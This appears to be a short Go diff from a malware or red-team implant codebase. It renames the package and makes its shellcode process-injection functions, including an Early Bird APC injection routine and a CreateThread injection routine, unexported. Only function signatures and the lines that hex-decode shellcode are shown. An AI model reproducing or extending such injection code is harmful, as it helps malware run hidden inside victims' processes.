@@ -1,4 +1,4 @@
-package deepfire
+package gryphon
 
 import (
 	"encoding/binary"
@@ -140,7 +140,7 @@ func injectIntoProcess(process, args, data string) bool {
 	return true
 }
 
-func InjectIntoProcessEarlyBird(process, args, data string) bool {
+func injectIntoProcessEarlyBird(process, args, data string) bool {
 	shellcode, errShellcode := hex.DecodeString(data)
 	if errShellcode != nil {
 		return false
@@ -217,7 +217,7 @@ func syscallInjectShellcode(data string) bool {
 	return true
 }
 
-func CreateThreadInject(data string) bool {
+func createThreadInject(data string) bool {
 	shellcode, errShellcode := hex.DecodeString(data)
 	if errShellcode != nil {
 		return false
